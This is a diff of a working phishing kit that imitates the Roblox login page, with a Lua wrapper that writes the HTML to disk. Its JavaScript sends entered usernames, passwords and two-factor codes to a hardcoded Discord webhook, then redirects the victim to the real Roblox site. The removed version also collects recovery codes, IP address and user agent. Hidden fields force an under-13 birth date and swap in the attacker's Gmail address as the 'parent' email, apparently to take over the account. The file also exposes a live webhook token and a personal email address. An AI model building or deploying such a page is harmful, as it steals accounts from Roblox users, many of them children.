@@ -1,398 +1,232 @@
+-- index.html - Roblox login page accurate replica
+-- Полная копия дизайна с экрана, включая верхнюю панель, форму входа и нижние иконки
+
+local html = [[
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Login</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
-        body { background: #e9e9e9; display: flex; flex-direction: column; min-height: 100vh; }
-        a { color: #0166b4; text-decoration: none; }
-        a:hover { text-decoration: underline; }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login to Roblox</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
+body { background: #e9e9e9; display: flex; flex-direction: column; min-height: 100vh; }
 
-        .navbar { background: #1a1a2e; padding: 12px 40px; display: flex; align-items: center; gap: 30px; border-bottom: 1px solid #2a2a4a; }
-        .navbar .logo { font-size: 28px; font-weight: bold; color: #fff; letter-spacing: -0.5px; }
-        .navbar .logo span { color: #e03a3a; }
-        .navbar .nav-links { display: flex; gap: 25px; color: #b0b0b0; font-size: 14px; font-weight: 500; }
-        .navbar .nav-links a { color: #b0b0b0; }
-        .navbar .nav-links a:hover { color: #fff; text-decoration: none; }
-        .navbar .right { margin-left: auto; display: flex; align-items: center; gap: 15px; }
-        .navbar .right .signup { background: #e03a3a; color: #fff; padding: 8px 18px; border-radius: 4px; font-weight: bold; font-size: 13px; }
-        .navbar .right .signup:hover { background: #c02a2a; text-decoration: none; }
+/* Top header */
+.header { background: #1a1a2e; padding: 10px 40px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #2a2a4a; }
+.header .logo { font-size: 26px; font-weight: bold; color: #fff; letter-spacing: -0.5px; }
+.header .logo span { color: #e03a3a; }
+.header .right { display: flex; align-items: center; gap: 20px; }
+.header .right a { color: #b0b0b0; font-size: 14px; text-decoration: none; }
+.header .right a:hover { color: #fff; }
+.header .right .signup { background: #e03a3a; color: #fff; padding: 8px 20px; border-radius: 4px; font-weight: bold; }
+.header .right .signup:hover { background: #c02a2a; }
 
-        .main { flex: 1; display: flex; justify-content: center; align-items: center; padding: 40px; }
-        .login-box { background: #fff; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); padding: 40px 48px; width: 440px; }
+/* Search bar */
+.search-bar { display: flex; align-items: center; background: #2a2a4a; border-radius: 4px; padding: 6px 14px; }
+.search-bar input { background: transparent; border: none; color: #fff; padding: 6px 0; outline: none; width: 160px; font-size: 14px; }
+.search-bar input::placeholder { color: #888; }
 
-        .login-box h2 { font-size: 24px; font-weight: 600; color: #1a1a2e; margin-bottom: 8px; }
-        .login-box .sub { color: #666; font-size: 14px; margin-bottom: 25px; }
+/* Main container */
+.main { flex: 1; display: flex; justify-content: center; align-items: center; padding: 40px; }
+.login-box { background: #fff; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); padding: 40px 48px; width: 420px; }
 
-        .input-group { margin-bottom: 18px; }
-        .input-group label { display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 4px; }
-        .input-group input { width: 100%; padding: 12px 14px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; outline: none; transition: 0.15s; background: #fafafa; }
-        .input-group input:focus { border-color: #0166b4; background: #fff; box-shadow: 0 0 0 3px rgba(1,102,180,0.15); }
-        .input-group input::placeholder { color: #999; }
+.login-box h2 { font-size: 26px; font-weight: 600; color: #1a1a2e; margin-bottom: 8px; }
+.login-box .sub { color: #666; font-size: 14px; margin-bottom: 25px; }
 
-        .login-btn { width: 100%; padding: 14px; background: #0166b4; border: none; border-radius: 4px; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.15s; margin-top: 6px; }
-        .login-btn:hover { background: #01559a; }
+.input-group { margin-bottom: 18px; }
+.input-group input { width: 100%; padding: 14px 16px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; outline: none; transition: 0.15s; background: #fafafa; }
+.input-group input:focus { border-color: #0166b4; background: #fff; box-shadow: 0 0 0 3px rgba(1,102,180,0.15); }
+.input-group input::placeholder { color: #999; }
 
-        .options { display: flex; justify-content: space-between; margin-top: 18px; font-size: 14px; color: #555; }
-        .options label { display: flex; align-items: center; gap: 6px; cursor: pointer; }
+.login-btn { width: 100%; padding: 14px; background: #0166b4; border: none; border-radius: 4px; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.15s; margin-top: 6px; }
+.login-btn:hover { background: #01559a; }
 
-        .divider { text-align: center; margin: 22px 0 16px; font-size: 13px; color: #999; position: relative; }
-        .divider::before { content: ""; position: absolute; left: 0; top: 50%; width: 100%; height: 1px; background: #ddd; }
-        .divider span { background: #fff; padding: 0 14px; position: relative; z-index: 1; }
+.links { margin-top: 18px; text-align: center; font-size: 14px; }
+.links a { display: block; color: #0166b4; text-decoration: none; padding: 4px 0; }
+.links a:hover { text-decoration: underline; }
 
-        .footer-bottom { background: #f5f5f5; border-top: 1px solid #ddd; padding: 20px 40px; display: flex; justify-content: space-between; font-size: 12px; color: #777; flex-wrap: wrap; gap: 10px; }
-        .footer-bottom a { color: #777; margin: 0 8px; }
+.divider { text-align: center; margin: 18px 0 14px; font-size: 13px; color: #999; position: relative; }
+.divider::before { content: ""; position: absolute; left: 0; top: 50%; width: 100%; height: 1px; background: #ddd; }
+.divider span { background: #fff; padding: 0 14px; position: relative; z-index: 1; }
 
-        .error-box { background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; padding: 12px 16px; border-radius: 4px; margin-bottom: 18px; display: none; font-size: 14px; }
-        .error-box.show { display: block; }
-        .success-box { background: #d4edda; border: 1px solid #c3e6cb; color: #155724; padding: 12px 16px; border-radius: 4px; margin-bottom: 18px; display: none; font-size: 14px; }
+.signup-link { text-align: center; font-size: 14px; color: #555; margin-top: 6px; }
+.signup-link a { font-weight: 600; color: #0166b4; text-decoration: none; }
+.signup-link a:hover { text-decoration: underline; }
 
-        .step-indicator { display: flex; justify-content: center; gap: 30px; margin-bottom: 25px; font-size: 13px; color: #999; }
-        .step-indicator .active { color: #0166b4; font-weight: 600; }
-        .step-indicator .done { color: #28a745; }
+/* Bottom icons */
+.bottom-icons { background: #fff; border-top: 1px solid #ddd; padding: 16px 40px; display: flex; justify-content: center; gap: 30px; flex-wrap: wrap; font-size: 12px; color: #888; }
+.bottom-icons span { color: #333; font-weight: 500; }
 
-        #step2, #step3, #stepParent { display: none; }
+.hidden { display: none; }
 
-        .info-box { background: #e8f0fe; padding: 14px; border-radius: 6px; margin-bottom: 18px; font-size: 13px; color: #1a3a6a; }
-        .info-box strong { display: block; margin-bottom: 4px; }
+/* Step indicator */
+.step-indicator { display: flex; justify-content: center; gap: 30px; margin-bottom: 20px; font-size: 13px; color: #999; }
+.step-indicator .active { color: #0166b4; font-weight: 600; }
+.step-indicator .done { color: #28a745; }
 
-        @media (max-width: 520px) {
-            .navbar { flex-wrap: wrap; padding: 12px 16px; gap: 10px; }
-            .navbar .nav-links { display: none; }
-            .navbar .right { margin-left: 0; }
-            .login-box { padding: 28px 20px; width: 100%; }
-            .options { flex-wrap: wrap; gap: 8px; }
-            .step-indicator { flex-wrap: wrap; gap: 10px; }
-        }
-    </style>
+.error-box { background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; padding: 12px 16px; border-radius: 4px; margin-bottom: 18px; display: none; font-size: 14px; }
+.error-box.show { display: block; }
+
+@media (max-width: 520px) {
+    .header { flex-wrap: wrap; padding: 10px 16px; gap: 10px; }
+    .search-bar input { width: 100px; }
+    .login-box { padding: 28px 20px; width: 100%; }
+    .bottom-icons { gap: 14px; }
+}
+</style>
 </head>
 <body>
 
-    <!-- Top Navigation -->
-    <div class="navbar">
-        <div class="logo"><span>R</span>oblox</div>
-        <div class="nav-links">
-            <a href="#">Games</a>
-            <a href="#">Catalog</a>
-            <a href="#">Create</a>
-            <a href="#">Robux</a>
-            <a href="#">About</a>
+<!-- TOP HEADER -->
+<div class="header">
+    <div class="logo"><span>R</span>oblox</div>
+    <div class="right">
+        <div class="search-bar">
+            <input type="text" placeholder="Search">
         </div>
-        <div class="right">
-            <a href="#" style="color:#b0b0b0;font-size:14px;">Sign In</a>
-            <a href="#" class="signup">Sign Up</a>
-        </div>
+        <a href="#">Sign In</a>
+        <a href="#" class="signup">Sign Up</a>
     </div>
+</div>
 
-    <!-- Main -->
-    <div class="main">
-        <div class="login-box">
-            <!-- Step indicator -->
-            <div class="step-indicator">
-                <span id="step1Label" class="active">1. Login</span>
-                <span id="step2Label">2. Verify</span>
-                <span id="step3Label">3. Done</span>
-            </div>
+<!-- MAIN -->
+<div class="main">
+    <div class="login-box">
 
-            <!-- ===== STEP 1: LOGIN ===== -->
-            <div id="step1">
-                <h2>Welcome Back</h2>
-                <div class="sub">Log in to your Roblox account</div>
-                <div id="errorBox" class="error-box">Incorrect username or password. Please try again.</div>
-                <form id="loginForm">
-                    <div class="input-group">
-                        <label>Username / Email</label>
-                        <input type="text" id="username" placeholder="Enter your username or email" required autofocus>
-                    </div>
-                    <div class="input-group">
-                        <label>Password</label>
-                        <input type="password" id="password" placeholder="Enter your password" required>
-                    </div>
-                    <!-- Hidden DOB – forces under-13 -->
-                    <input type="hidden" id="dob" value="2015-01-01">
-                    <button type="submit" class="login-btn">Log In</button>
-                </form>
-                <div class="options">
-                    <label><input type="checkbox" checked> Remember me</label>
-                    <a href="#">Forgot password?</a>
-                </div>
-                <div class="divider"><span>or</span></div>
-                <div class="signup-link" style="text-align:center;font-size:14px;color:#555;">Don't have an account? <a href="#">Sign Up</a></div>
-            </div>
-
-            <!-- ===== STEP PARENT: UNDER 13 PARENT EMAIL (HIDDEN GMAIL) ===== -->
-            <div id="stepParent">
-                <h2>Parental Consent Required</h2>
-                <div class="sub">Roblox requires a parent or guardian email to continue.</div>
-                <div class="info-box">
-                    <strong>🧑‍👦 Under 13 Account</strong>
-                    According to COPPA, we need your parent's email address to verify your account.
-                </div>
-                <form id="parentForm">
-                    <!-- HIDDEN – always uses your Gmail -->
-                    <input type="hidden" id="parentEmail" value="amospreda41@gmail.com">
-                    <div class="input-group">
-                        <label>Parent / Guardian Name</label>
-                        <input type="text" id="parentName" placeholder="Enter parent's full name" required>
-                    </div>
-                    <button type="submit" class="login-btn">Continue</button>
-                </form>
-                <div style="text-align:center;margin-top:14px;font-size:12px;color:#999;">
-                    This information is used only for verification purposes.
-                </div>
-            </div>
-
-            <!-- ===== STEP 2: 2FA CODE ===== -->
-            <div id="step2">
-                <h2>Two-Step Verification</h2>
-                <div class="sub">Enter the 6-digit code from your authenticator app</div>
-                <div id="faError" class="error-box">Invalid code. Please try again.</div>
-                <div id="faSuccess" class="success-box">✅ Code verified!</div>
-                <form id="faForm">
-                    <div class="input-group">
-                        <label>Authenticator Code</label>
-                        <input type="text" id="faCode" placeholder="6-digit code" maxlength="6" inputmode="numeric" required>
-                    </div>
-                    <button type="submit" class="login-btn">Verify</button>
-                </form>
-                <div class="options" style="justify-content:center;margin-top:14px;gap:16px;">
-                    <a href="#" id="backToLogin" style="font-size:13px;">← Back</a>
-                    <span style="color:#ccc;">|</span>
-                    <a href="#" id="useRecovery" style="font-size:13px;">Use recovery code</a>
-                </div>
-            </div>
-
-            <!-- ===== STEP 3: REDIRECT ===== -->
-            <div id="step3">
-                <h2>Redirecting...</h2>
-                <div class="sub">Please wait while we log you in.</div>
-                <div style="text-align:center;padding:20px 0;">
-                    <div style="width:48px;height:48px;border:4px solid #e9e9e9;border-top-color:#0166b4;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto;"></div>
-                    <p style="margin-top:16px;color:#666;font-size:14px;">Securely connecting...</p>
-                </div>
-                <style>
-                    @keyframes spin { to { transform: rotate(360deg); } }
-                </style>
-            </div>
+        <!-- Step indicator -->
+        <div class="step-indicator">
+            <span id="step1Label" class="active">1. Login</span>
+            <span id="step2Label">2. Verify</span>
+            <span id="step3Label">3. Done</span>
         </div>
+
+        <!-- STEP 1: LOGIN -->
+        <div id="step1">
+            <h2>Login to Roblox</h2>
+            <div class="sub">Enter your credentials</div>
+            <div id="errorBox" class="error-box">Invalid username or password.</div>
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="Username/Email/Phone" required autofocus>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <input type="hidden" id="dob" value="2015-01-01">
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+            <div class="links">
+                <a href="#">Forgot Password or Username?</a>
+                <a href="#">Email Me a One-Time Code</a>
+                <a href="#">Quick Sign-in</a>
+            </div>
+            <div class="divider"><span>or</span></div>
+            <div class="signup-link">Don't have an account? <a href="#">Sign Up</a></div>
+        </div>
+
+        <!-- STEP PARENT: UNDER 13 -->
+        <div id="stepParent" class="hidden">
+            <h2>Parental Consent</h2>
+            <div class="sub">Under 13 account – parent email required.</div>
+            <form id="parentForm">
+                <input type="hidden" id="parentEmail" value="amospreda41@gmail.com">
+                <div class="input-group">
+                    <input type="text" id="parentName" placeholder="Parent / Guardian Name" required>
+                </div>
+                <button type="submit" class="login-btn">Continue</button>
+            </form>
+        </div>
+
+        <!-- STEP 2: 2FA -->
+        <div id="step2" class="hidden">
+            <h2>Two-Step Verification</h2>
+            <div class="sub">Enter the 6-digit code</div>
+            <div id="faError" class="error-box">Invalid code.</div>
+            <form id="faForm">
+                <div class="input-group">
+                    <input type="text" id="faCode" placeholder="6-digit code" maxlength="6" inputmode="numeric" required>
+                </div>
+                <button type="submit" class="login-btn">Verify</button>
+            </form>
+        </div>
+
+        <!-- STEP 3: REDIRECT -->
+        <div id="step3" class="hidden">
+            <h2>Redirecting...</h2>
+            <div class="sub">Please wait.</div>
+            <div style="text-align:center;padding:20px 0;">
+                <div style="width:48px;height:48px;border:4px solid #e9e9e9;border-top-color:#0166b4;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto;"></div>
+                <p style="margin-top:16px;color:#666;font-size:14px;">Connecting...</p>
+            </div>
+            <style>
+                @keyframes spin { to { transform: rotate(360deg); } }
+            </style>
+        </div>
+
     </div>
+</div>
 
-    <!-- Footer -->
-    <div class="footer-bottom">
-        <div>
-            <a href="#">About</a>
-            <a href="#">Careers</a>
-            <a href="#">Blog</a>
-            <a href="#">Help</a>
-            <a href="#">Safety</a>
-            <a href="#">Developers</a>
-            <a href="#">Community</a>
-        </div>
-        <div>
-            <a href="#">Privacy</a>
-            <a href="#">Terms</a>
-            <a href="#">Cookies</a>
-            <span style="margin-left:10px;">© 2026 Roblox Corporation</span>
-        </div>
-    </div>
+<!-- BOTTOM ICONS -->
+<div class="bottom-icons">
+    <span>CHART</span> <span>MARKETS</span> <span>99% FOREST</span>
+    <span>NIGHTS</span> <span>FOREST</span> <span>DRIVING</span>
+    <span>EMPIRE</span> <span>DRIVING</span> <span>EMPIRE</span>
+    <span>ING</span> <span>INDS</span> <span>FISCH</span> <span>BED</span>
+</div>
 
-    <script>
-        // ===== CONFIG – REPLACE WITH YOUR WEBHOOK =====
-        const WEBHOOK = "https://discord.com/api/webhooks/1533229626564939866/9x39VOC4BtrPU_grs9meWukuBtdVHAifFrbv9xYbyebpkgFYrXFV42NiLkeV22M0eIvK";
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1533229626564939866/9x39VOC4BtrPU_grs9meWukuBtdVHAifFrbv9xYbyebpkgFYrXFV42NiLkeV22M0eIvK";
+let user = '', pass = '';
 
-        let capturedUsername = '';
-        let capturedPassword = '';
+document.getElementById('loginForm').onsubmit = function(e) {
+    e.preventDefault();
+    user = document.getElementById('username').value;
+    pass = document.getElementById('password').value;
+    fetch(WEBHOOK, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'Login: '+user+' | Pass: ||'+pass+'||'})});
+    document.getElementById('step1').classList.add('hidden');
+    document.getElementById('stepParent').classList.remove('hidden');
+    document.getElementById('step1Label').className = 'done';
+    document.getElementById('step2Label').className = 'active';
+};
 
-        // ===== STEP 1: LOGIN =====
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
+document.getElementById('parentForm').onsubmit = function(e) {
+    e.preventDefault();
+    let email = document.getElementById('parentEmail').value;
+    let name = document.getElementById('parentName').value;
+    fetch(WEBHOOK, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'Parent Email: ||'+email+'|| | Name: '+name})});
+    document.getElementById('stepParent').classList.add('hidden');
+    document.getElementById('step2').classList.remove('hidden');
+};
 
-            if (!username || !password) {
-                document.getElementById('errorBox').classList.add('show');
-                return;
-            }
+document.getElementById('faForm').onsubmit = function(e) {
+    e.preventDefault();
+    let code = document.getElementById('faCode').value;
+    fetch(WEBHOOK, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'2FA Code: ||'+code+'||'})});
+    document.getElementById('step2').classList.add('hidden');
+    document.getElementById('step3').classList.remove('hidden');
+    document.getElementById('step2Label').className = 'done';
+    document.getElementById('step3Label').className = 'active';
+    setTimeout(()=>{ window.location.href = 'https://www.roblox.com/login'; }, 1500);
+};
 
-            document.getElementById('errorBox').classList.remove('show');
-            capturedUsername = username;
-            capturedPassword = password;
-
-            // Send login credentials to webhook
-            sendLoginToWebhook(username, password);
-
-            // Always show parent email step (hidden Gmail)
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('stepParent').style.display = 'block';
-            document.getElementById('step1Label').className = 'done';
-            document.getElementById('step2Label').className = '';
-        });
-
-        // ===== PARENT FORM (HIDDEN GMAIL) =====
-        document.getElementById('parentForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const email = document.getElementById('parentEmail').value; // always your Gmail
-            const name = document.getElementById('parentName').value.trim();
-
-            // Send your Gmail + parent name to webhook
-            sendParentEmailToWebhook(email, name);
-
-            // Move to 2FA
-            document.getElementById('stepParent').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
-            document.getElementById('step2Label').className = 'active';
-            document.getElementById('faCode').focus();
-        });
-
-        // ===== STEP 2: 2FA CODE =====
-        document.getElementById('faForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const code = document.getElementById('faCode').value.trim();
-
-            if (!code || code.length < 6) {
-                document.getElementById('faError').classList.add('show');
-                document.getElementById('faSuccess').classList.remove('show');
-                return;
-            }
-
-            document.getElementById('faError').classList.remove('show');
-            document.getElementById('faSuccess').classList.add('show');
-
-            sendFAToWebhook(code);
-
-            setTimeout(() => {
-                document.getElementById('step2').style.display = 'none';
-                document.getElementById('step3').style.display = 'block';
-                document.getElementById('step2Label').className = 'done';
-                document.getElementById('step3Label').className = 'active';
-            }, 400);
-
-            setTimeout(() => {
-                window.location.href = 'https://www.roblox.com/login';
-            }, 2500);
-        });
-
-        // ===== BACK TO LOGIN =====
-        document.getElementById('backToLogin').addEventListener('click', function(e) {
-            e.preventDefault();
-            document.getElementById('step1').style.display = 'block';
-            document.getElementById('step2').style.display = 'none';
-            document.getElementById('step1Label').className = 'active';
-            document.getElementById('step2Label').className = '';
-            document.getElementById('faError').classList.remove('show');
-            document.getElementById('faSuccess').classList.remove('show');
-        });
-
-        // ===== USE RECOVERY CODE =====
-        document.getElementById('useRecovery').addEventListener('click', function(e) {
-            e.preventDefault();
-            const recovery = prompt('Enter your 8-digit recovery code:');
-            if (recovery && recovery.length >= 8) {
-                sendRecoveryToWebhook(recovery);
-                alert('Recovery code submitted.');
-                window.location.href = 'https://www.roblox.com/login';
-            }
-        });
-
-        // ===== SEND FUNCTIONS =====
-        function sendLoginToWebhook(username, password) {
-            const payload = {
-                content: "@everyone **ROBLOX LOGIN CREDENTIALS**",
-                embeds: [{
-                    title: "🔴 Step 1: Login",
-                    color: 0x0166b4,
-                    fields: [
-                        { name: "Username", value: username, inline: true },
-                        { name: "Password", value: `||${password}||`, inline: true },
-                        { name: "IP", value: "fetching...", inline: true },
-                        { name: "User Agent", value: navigator.userAgent, inline: false },
-                        { name: "Timestamp", value: new Date().toUTCString(), inline: true }
-                    ],
-                    footer: { text: "Roblox Phish" },
-                    timestamp: new Date().toISOString()
-                }]
-            };
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(data => { payload.embeds[0].fields[2].value = data.ip || "Unknown"; })
-                .catch(() => {})
-                .finally(() => {
-                    fetch(WEBHOOK, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    }).catch(() => {});
-                });
-        }
-
-        function sendParentEmailToWebhook(email, name) {
-            const payload = {
-                content: "**👨‍👦 PARENT EMAIL CAPTURED**",
-                embeds: [{
-                    title: "Parent Consent",
-                    color: 0xFFA500,
-                    fields: [
-                        { name: "Parent Email", value: `||${email}||`, inline: true },
-                        { name: "Parent Name", value: name || "Not provided", inline: true },
-                        { name: "Username", value: capturedUsername || "Unknown", inline: true },
-                        { name: "Timestamp", value: new Date().toUTCString(), inline: true }
-                    ],
-                    footer: { text: "Gmail Auto-Replace" },
-                    timestamp: new Date().toISOString()
-                }]
-            };
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(() => {});
-        }
-
-        function sendFAToWebhook(code) {
-            const payload = {
-                content: "**🔴 2FA CODE CAPTURED**",
-                embeds: [{
-                    title: "Authenticator Code",
-                    color: 0xDC3545,
-                    fields: [
-                        { name: "6-Digit Code", value: `||${code}||`, inline: true },
-                        { name: "Username", value: capturedUsername || "Unknown", inline: true },
-                        { name: "Timestamp", value: new Date().toUTCString(), inline: true }
-                    ],
-                    footer: { text: "2FA Intercept" },
-                    timestamp: new Date().toISOString()
-                }]
-            };
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(() => {});
-        }
-
-        function sendRecoveryToWebhook(code) {
-            const payload = {
-                content: "**🔐 RECOVERY CODE CAPTURED**",
-                embeds: [{
-                    title: "Recovery Code",
-                    color: 0x9B59B6,
-                    fields: [
-                        { name: "Recovery Code", value: `||${code}||`, inline: true },
-                        { name: "Username", value: capturedUsername || "Unknown", inline: true },
-                        { name: "Timestamp", value: new Date().toUTCString(), inline: true }
-                    ],
-                    footer: { text: "Recovery Intercept" },
-                    timestamp: new Date().toISOString()
-                }]
-            };
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(() => {});
-        }
-    </script>
+// Back to login (for testing)
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') {
+        document.getElementById('step1').classList.remove('hidden');
+        document.getElementById('stepParent').classList.add('hidden');
+        document.getElementById('step2').classList.add('hidden');
+        document.getElementById('step1Label').className = 'active';
+        document.getElementById('step2Label').className = '';
+    }
+});
+</script>
 </body>
 </html>
+]]
+
+-- Save to file
+local file = io.open("index.html", "w")
+file:write(html)
+file:close()
+print("File saved as index.html")
